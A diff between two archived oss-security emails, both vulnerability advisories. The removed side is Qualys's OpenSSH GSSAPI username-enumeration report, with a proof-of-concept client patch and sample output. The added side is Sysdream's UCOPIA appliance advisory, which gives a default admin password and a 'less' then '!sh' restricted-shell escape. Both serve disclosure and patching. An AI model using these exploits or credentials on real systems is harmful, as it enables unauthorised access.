@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["8094" "Tuesday" "28" "August" "2018" "09:55:23" "+0200" "Marcus Meissner" "meissner@suse.de" "<20180828075523.i3pyzaxxa7yrhbq5@suse.de>" "179" "Re: [oss-security] Another OpenSSH \"user enumeration\"" "^Date:" nil nil "8" "2018082807:55:23" "[oss-security] Another OpenSSH \"user enumeration\"" (number mark "        meissner@sus Aug 28  179/8094  " thread-indent "\"Re: [oss-security] Another OpenSSH \"user enumeration\"\"\n") "<20180827162730.GA24878@localhost.localdomain>" ("<20180827162730.GA24878@localhost.localdomain>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4370" "Friday" "29" "September" "2017" "15:01:27" "+0200" "Sysdream Labs" "labs@sysdream.com" "<89daa805-6ad8-8738-dc2b-0b248716da38@sysdream.com>" "148" "[oss-security] [CVE-2017-11321] UCOPIA Wireless Appliance < 5.1.8 Restricted Shell Escape" nil nil nil "9" "2017092913:01:27" "[oss-security] [CVE-2017-11321] UCOPIA Wireless Appliance < 5.1.8 Restricted Shell Escape" (number mark "U       labs@sysdrea Sep 29  148/4370  " thread-indent "\"[oss-security] [CVE-2017-11321] UCOPIA Wireless Appliance < 5.1.8 Restricted Shell Escape\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 27924 invoked by uid 550); 28 Aug 2018 07:55:36 -0000
+Received: (qmail 13319 invoked by uid 550); 29 Sep 2017 13:01:44 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,200 +11,176 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 27906 invoked from network); 28 Aug 2018 07:55:35 -0000
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-Message-ID: <20180828075523.i3pyzaxxa7yrhbq5@suse.de>
-References: <20180827162730.GA24878@localhost.localdomain>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20180827162730.GA24878@localhost.localdomain>
-Organization: SUSE Linux GmbH, GF: =?iso-8859-1?Q?Felix_?=
- =?iso-8859-1?Q?Imend=F6rffer=2C_Jane_Smithard=2C_Graham_Norton=2C_HRB_212?=
- =?iso-8859-1?Q?84_=28AG_N=FCrnberg=29?=
-User-Agent: NeoMutt/20170421 (1.8.2)
-Date: Tue, 28 Aug 2018 09:55:23 +0200
-From: Marcus Meissner <meissner@suse.de>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Another OpenSSH "user enumeration"
-To: oss-security@lists.openwall.com
+Received: (qmail 12277 invoked from network); 29 Sep 2017 13:01:43 -0000
+DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 774151A1434
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
+	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1506690090;
+	bh=S86E2G84bCkzUe6Y7qvbYOcnxm61gKLWEz2w3MM+tpw=;
+	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
+	b=Ag3H6uGybo5WZmH5ppbLr0bgUlbcHUWjbaihS/ntJ8T9iupZP5R+Qv5LITeQiDmZp
+	 Z4SYfHVCuD8l663wZTKcbnqIpr3nJeX/zwMNUUbDPL5BBVaG4Ux7gv2sFK6CBgZ2+J
+	 d+jXaYpvQ2EdGnoaYV6EICQNpQuvlgSRxLYFeaBU=
+X-Virus-Scanned: amavisd-new at sysdream.com
+To: fulldisclosure@seclists.org
+Cc: oss-security@lists.openwall.com
+From: Sysdream Labs <labs@sysdream.com>
+Message-ID: <89daa805-6ad8-8738-dc2b-0b248716da38@sysdream.com>
+Date: Fri, 29 Sep 2017 15:01:27 +0200
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.2.1
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="eQeAqpowrgb36cOMGa9hnf5eHoInpqBx1"
+Subject: [oss-security] [CVE-2017-11321] UCOPIA Wireless Appliance < 5.1.8 Restricted Shell
+ Escape
 
-Hi,
+--eQeAqpowrgb36cOMGa9hnf5eHoInpqBx1
+Content-Type: multipart/mixed; boundary="6dsSIWm2RpPRogpi6qxIjwWioSlm5OtNE";
+ protected-headers="v1"
+From: Sysdream Labs <labs@sysdream.com>
+To: fulldisclosure@seclists.org
+Cc: oss-security@lists.openwall.com
+Message-ID: <89daa805-6ad8-8738-dc2b-0b248716da38@sysdream.com>
+Subject: [CVE-2017-11321] UCOPIA Wireless Appliance < 5.1.8 Restricted Shell
+ Escape
 
-Mitre has assigned CVE-2018-15919
+--6dsSIWm2RpPRogpi6qxIjwWioSlm5OtNE
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
+Content-Transfer-Encoding: quoted-printable
 
-Ciao, Marcus
+# [CVE-2017-11321] UCOPIA Wireless Appliance < 5.1.8 Restricted Shell Escape
 
-On Mon, Aug 27, 2018 at 09:27:30AM -0700, Qualys Security Advisory wrote:
-> Hi all,
-> 
-> On August 24, 2018, we sent the following email to openssh@openssh.com
-> and distros@vs.openwall.org. About the disclosure of this issue, Solar
-> Designer wrote "I'd be even happier with it being made public right away
-> if that's OK with both the OpenSSH team and Qualys", and Theo de Raadt
-> wrote "More than reporting to us, I urge you to publish it"; for a
-> detailed explanation, please refer to Damien Miller's post:
-> 
-> http://www.openwall.com/lists/oss-security/2018/08/24/1
-> 
-> We thank the OpenSSH developers and the members of
-> distros@vs.openwall.org for their constructive comments, suggestions,
-> and feedback.
-> 
-> ========================================================================
-> 
-> While properly reviewing the now-famous OpenSSH commit
-> https://github.com/openbsd/src/commit/779974d35b4859c07bc3cb8a12c74b43b0a7d1e0
-> we discovered another username-enumeration vulnerability in auth2-gss.c
-> (enabled by default on at least Fedora, CentOS, and Red Hat Enterprise
-> Linux).
-> 
-> This vulnerability affects OpenSSH versions from 5.9 (September 6, 2011)
-> to the recently released 7.8 (August 24, 2018), inclusive. It is quite
-> similar to CVE-2018-15473 (it is not a timing attack), but it is also
-> markedly different (code excerpts from OpenSSH 7.8p1):
-> 
->  61 static int
->  62 userauth_gssapi(struct ssh *ssh)
->  63 {
-> ...
-> 106         if (!authctxt->valid || authctxt->user == NULL) {
-> 107                 debug2("%s: disabled because of invalid user", __func__);
-> 108                 free(doid);
-> 109                 return (0);
-> 110         }
-> 111 
-> 112         if (GSS_ERROR(PRIVSEP(ssh_gssapi_server_ctx(&ctxt, &goid)))) {
-> 113                 if (ctxt != NULL)
-> 114                         ssh_gssapi_delete_ctx(&ctxt);
-> 115                 free(doid);
-> 116                 authctxt->server_caused_failure = 1;
-> 117                 return (0);
-> 118         }
-> ...
-> 123         if ((r = sshpkt_start(ssh, SSH2_MSG_USERAUTH_GSSAPI_RESPONSE)) != 0 ||
-> 124             (r = sshpkt_put_string(ssh, doid, len)) != 0 ||
-> 125             (r = sshpkt_send(ssh)) != 0)
-> ...
-> 132         authctxt->postponed = 1;
-> 133 
-> 134         return (0);
-> 135 }
-> 
-> - If this first step of the GSSAPI authentication succeeds, then
->   "postponed" is set to 1 (at line 132) and the server sends a packet
->   SSH2_MSG_USERAUTH_GSSAPI_RESPONSE to the attacker (at lines 123-125):
->   in this particular case, the user is necessarily valid (it exists).
-> 
-> - Otherwise "postponed" is not set, and userauth_gssapi() returns 0 at
->   line 117 or 109: in both cases, the server's userauth_finish() sends a
->   packet SSH2_MSG_USERAUTH_FAILURE to the attacker, who should therefore
->   be unable to distinguish between a valid and invalid user. However, if
->   the user is valid, then "server_caused_failure" is set (at line 116);
->   if the user is invalid, it is not set. Consequently, the behavior of
->   userauth_finish() changes:
-> 
-> 340 void
-> 341 userauth_finish(struct ssh *ssh, int authenticated, const char *method,
-> 342     const char *submethod)
-> 343 {
-> ...
-> 410                 if (!partial && !authctxt->server_caused_failure &&
-> 411                     (authctxt->attempt > 1 || strcmp(method, "none") != 0))
-> 412                         authctxt->failures++;
-> 413                 if (authctxt->failures >= options.max_authtries) {
-> ...
-> 417                         auth_maxtries_exceeded(authctxt);
-> 418                 }
-> ...
-> 422                 packet_start(SSH2_MSG_USERAUTH_FAILURE);
-> 423                 packet_put_cstring(methods);
-> 424                 packet_put_char(partial);
-> 425                 packet_send();
-> ...
-> 429 }
-> 
->   . if the user is valid, then "server_caused_failure" is set,
->     "failures" is not incremented, and the attacker can attempt the
->     GSSAPI authentication indefinitely;
-> 
->   . if the user is invalid, then "server_caused_failure" is not set,
->     "failures" is incremented (at line 412), and the server will
->     disconnect the attacker (at line 417) after max_authtries
->     authentication attempts (6, by default).
-> 
-> Below is a very crude proof-of-concept (a patch for the client in
-> OpenSSH 7.8p1):
-> 
-> ------------------------------------------------------------------------
-> 
-> diff -pruN openssh-7.8p1/gss-genr.c openssh-7.8p1-poc/gss-genr.c
-> --- openssh-7.8p1/gss-genr.c	2018-08-22 22:41:42.000000000 -0700
-> +++ openssh-7.8p1-poc/gss-genr.c	2018-08-22 22:41:42.000000000 -0700
-> @@ -286,6 +286,7 @@ ssh_gssapi_check_mechanism(Gssctxt **ctx
->  
->  	ssh_gssapi_build_ctx(ctx);
->  	ssh_gssapi_set_oid(*ctx, oid);
-> +	return 1;
->  	major = ssh_gssapi_import_name(*ctx, host);
->  	if (!GSS_ERROR(major)) {
->  		major = ssh_gssapi_init_ctx(*ctx, 0, GSS_C_NO_BUFFER, &token, 
-> diff -pruN openssh-7.8p1/sshconnect2.c openssh-7.8p1-poc/sshconnect2.c
-> --- openssh-7.8p1/sshconnect2.c	2018-08-22 22:41:42.000000000 -0700
-> +++ openssh-7.8p1-poc/sshconnect2.c	2018-08-22 22:41:42.000000000 -0700
-> @@ -701,6 +701,7 @@ userauth_gssapi(Authctxt *authctxt)
->  	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN, &input_gssapi_token);
->  	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERROR, &input_gssapi_error);
->  	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERRTOK, &input_gssapi_errtok);
-> +	return 1;
->  
->  	mech++; /* Move along to next candidate */
->  
-> ------------------------------------------------------------------------
-> 
-> For example, on Fedora, "adm" is a valid user, but "pocorgtfo" is not:
-> 
-> ------------------------------------------------------------------------
-> 
-> ./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic adm@127.0.0.1
-> ...
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Next authentication method: gssapi-with-mic
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> ...
-> 
-> ./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic pocorgtfo@127.0.0.1
-> ...
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Next authentication method: gssapi-with-mic
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> debug1: Authentications that can continue: publickey,gssapi-with-mic,password
-> Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
-> Disconnected from 127.0.0.1 port 22
-> 
-> ------------------------------------------------------------------------
-> 
-> We understand that the OpenSSH developers do not want to treat such a
-> username enumeration (or "oracle") as a vulnerability (although it is
-> quite useful in an attacker's toolbox), but how should we coordinate
-> this disclosure, then? OpenSSH developers, distros, please advise.
-> 
-> Thank you very much! With best regards,
-> 
-> -- 
-> the Qualys Security Advisory team
-> 
+## Asset Description
 
--- 
-Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@suse.de>
+UCOPIA solutions bring together a combination of software, appliance and cl=
+oud services serving small to large customers.
+
+More than 12,000 UCOPIA solutions are deployed and maintained by UCOPIA exp=
+ert partners all over the world.
+
+The affected asset in this report is a WiFi management appliance.
+
+
+## Vulnerability
+
+Shell Escape via `less` command.
+
+**Threat**
+
+Improper sanitization of system commands in the restricted shell interface =
+in UCOPIA Wireless Appliance, prior to 5.1.8, allows remote attackers to ga=
+in access to a system shell as the "admin" user.
+
+**CVE ID**: CVE-2017-11321
+
+**Access Vector**: network
+
+**Security Risk**: critical
+
+**Vulnerability**: CWE-78
+
+**CVSS Base Score**: 9.1 (Critical)
+
+**CVSS Vector**: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
+
+### Proof of Concept: Restricted Shell Escape
+
+By default, the UCOPIA wireless appliances exposes two shell access on port=
+ 22 (SSH) and 222 (ShellInTheBox).
+
+A documented **admin** user exists on the system with the password **bhu85t=
+gb**.
+
+Quoted from the documentation :
+
+> You can also retrieve the IP address of the outgoing interface. For this,=
+ you need to log in to the terminal of the virtual machine with
+the following username and password: admin/bhu85tgb, and then execute the i=
+nterface command.
+
+By logging in within these interfaces, we can access to a restricted shell =
+(*clish*) that allows only a few commands.
+
+However, the `less` command is allowed, and because `less` allows to execut=
+e shell commands when viewing a file, we can use it to escape the restricte=
+d shell.
+
+Steps :
+
+**1/** Login to the appliance using SSH or ShellInTheBox.
+
+**2/** Run the `less /etc/passwd` command.
+
+**3/** When viewing the file, type `!sh`
+
+**4/** You now have unrestricted `admin` user access to the appliance.
+
+```
+> less /etc/passwd
+!sh
+$ ls /
+bin dev etc home lib proc tmp user
+$ whoami
+admin
+```
+
+## Solution
+
+Update to UCOPIA 5.1.8
+
+## Timeline (dd/mm/yyyy)
+
+* 08/03/2017 : Vulnerability discovery.
+* 03/05/2017 : Initial contact.
+* 10/05/2017 : GPG Key exchange.
+* 10/05/2017 : Advisory sent to vendor.
+* 17/05/2017 : Request for feedback.
+* 22/05/2017 : Vendor acknowledge the vulnerabilities.
+* 21/06/2017 : Sysdream Labs request for an ETA, warning for public disclos=
+ure.
+* 21/06/2017 : Vendor say that the UCOPIA 5.1.8 fixes the issue.
+* 29/09/2017 : Public disclosure.
+
+## Credits
+
+* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
+
+--=20
+SYSDREAM Labs <labs@sysdream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+--6dsSIWm2RpPRogpi6qxIjwWioSlm5OtNE--
+
+--eQeAqpowrgb36cOMGa9hnf5eHoInpqBx1
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEER9HhJMQ++ZIqLhVRjrSM2dWyWaEFAlnORCkACgkQjrSM2dWy
+WaGziA/+NUkfdv+zKWb6TNM3srKV5EwCcFFtQjce/7af7bd4YnMPTPwwHxQ1ygrc
+R6kx9a7xxlkYuMdoyhAkXFvLm2d6ZfUBXdS54+QeRgEzsuFajO5lM4JzLfrM+L9v
+FaBBQ5csrD7l0VeMWyBA2v8JTju7Jjc2Lyw1oCzjVx0vmDfDpwNYIiMzlbKVLGxG
+JP43BjNDskvgmKrJDOlEhCFQEQhodeayCX6bfGM/jemBI3BA9zpownSUyFd1HR/p
+EUWBcCbdgei0ShPIT15Slg0LqD/Cu8L01Sj140BXD9vQFBVM4aWrGJ3Uqs+W4xIy
+rQdR+5ERfOXI7FnAEQAWKp9HfSSkprXgd7Z90pCzzpZYp2s3XDMA/VGEigr9Kpvq
+3IjcSvQHB/raIprfQ1ry7+C8ym8mEI9mkMxTnaotrO5O0f0olhVzFtqqPW0GXJD5
+e94B7mdz11fZEbNE632ZEuBQ5XYnRzUe4QKUyZma4b3wXPOczjbbDL11Dx6DYvpf
+esCEoXKFJumkBoJUqXKnlVqPXVuySp4elmMjIY2NYfmcdS5wVoQifsVBZj0Ag7Kt
+9s7lcLJ7rrHEajJXk0MG+qaqZQSOMkZFu+IO5EEySLxZ57gEMjb3Wny/lVOjbBOp
+m1zLBEtGcf73dw8CVVNwL7O0z6rzRUp5A/pMBo9EJASAr0gRdus=
+=lkRH
+-----END PGP SIGNATURE-----
+
+--eQeAqpowrgb36cOMGa9hnf5eHoInpqBx1--
